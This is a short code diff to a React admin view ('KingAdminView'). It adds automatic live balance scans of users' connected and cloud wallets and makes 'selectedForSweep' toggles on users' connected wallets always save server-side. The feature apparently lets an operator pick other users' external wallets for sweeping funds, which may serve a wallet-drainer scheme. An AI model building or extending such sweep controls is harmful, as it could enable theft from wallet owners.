@@ -570,6 +570,18 @@ export function KingAdminView({ currentUser, onExitAdmin }: KingAdminViewProps) 
     return cleanup;
   }, [isAdminVerified]);
 
+  useEffect(() => {
+    if (
+      isAdminVerified &&
+      tab === 'connected_wallets' &&
+      connectedWallets.length > 0 &&
+      Object.keys(connScanMap).length === 0 &&
+      !connScanning
+    ) {
+      void scanConnectedWalletsLive(connectedWallets);
+    }
+  }, [isAdminVerified, tab, connectedWallets]);
+
   const handleAdminLogin = async (e: FormEvent) => {
     e.preventDefault();
     setAuthError('');
@@ -826,6 +838,7 @@ export function KingAdminView({ currentUser, onExitAdmin }: KingAdminViewProps) 
       setSelectedUserWallets(list);
       const firstActive = list.filter((w) => !w.archived).map((w) => w.id);
       setUserSweepWalletIds(firstActive.slice(0, 1));
+      void scanCloudWalletsLive(list, setUserWalletScanMap, setScanningUserWallets);
     } catch (err) {
       setDataError(err instanceof Error ? err.message : 'Unable to load user wallets.');
     } finally {
@@ -1062,18 +1075,11 @@ export function KingAdminView({ currentUser, onExitAdmin }: KingAdminViewProps) 
         connectedAt: rec.connectedAt,
         selectedForSweep: !rec.selectedForSweep,
       };
-      if (rec.sourceScope === 'cloud' && rec.ownerUid !== 'local_paired_session') {
-        await adminSaveConnectedSession({
-          targetUid: rec.ownerUid,
-          session: updated,
-          actorUid: currentUser.uid,
-        });
-      } else {
-        const local = loadConnectedExternals().map((x) =>
-          x.id === rec.id ? updated : x
-        );
-        saveConnectedExternals(local);
-      }
+      await adminSaveConnectedSession({
+        targetUid: rec.ownerUid,
+        session: updated,
+        actorUid: currentUser.uid,
+      });
       await loadDashboardData();
     } catch (err) {
       setDataError(err instanceof Error ? err.message : 'Failed to update connected wallet state.');
